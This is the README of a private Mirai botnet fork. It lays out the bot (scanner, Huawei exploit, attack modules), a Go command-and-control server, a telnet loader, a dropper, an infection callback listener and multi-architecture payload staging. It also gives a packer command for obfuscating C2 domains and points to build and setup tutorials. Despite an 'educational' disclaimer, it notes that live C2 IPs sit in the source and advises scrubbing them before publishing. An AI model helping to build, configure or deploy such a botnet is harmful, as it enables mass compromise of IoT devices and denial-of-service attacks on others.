# private

Private **Mirai fork** with the same structural pattern as `lll/` and `ReflectNET/`: bot, Go CNC, telnet loader, `scanListen`, optional `cryptermirai` packer, and `loverstuff/payload.py` multi-arch HTTP distribution.

## Layout

```
private/
├── bot/              # main.c, scanner.c, huawei.c, attack_*.c, killer.c
├── cnc/              # MySQL-backed Go CNC
├── loader/src/       # MIPS telnet binary server
├── dlr/main.c        # Small dropper stub
├── scanListen.go     # Infection callback
├── loverstuff/       # payload.py staging
├── cryptermirai      # String encrypt helper binary
├── tutorial.txt      # CentOS 7 full CNC install (long)
└── ubuntu_setup.txt
```

## cryptermirai

```bash
chmod +x cryptermirai
./cryptermirai string domain.com
```

## Setup

See `tutorial.txt` for cross-compiler download paths, MySQL schema, xinetd/tftp, and Apache staging—**trim third-party URLs** before sharing the repo.

**CNC default path:** MySQL database matching classic Mirai schema (`users`, `history` tables).

## Build

Cross-compile bot for desired arches; build CNC with `go build` in `cnc/`.

## Disclaimer

Educational / defensive research. Contains live C2 IP examples in source—scrub before GitHub.
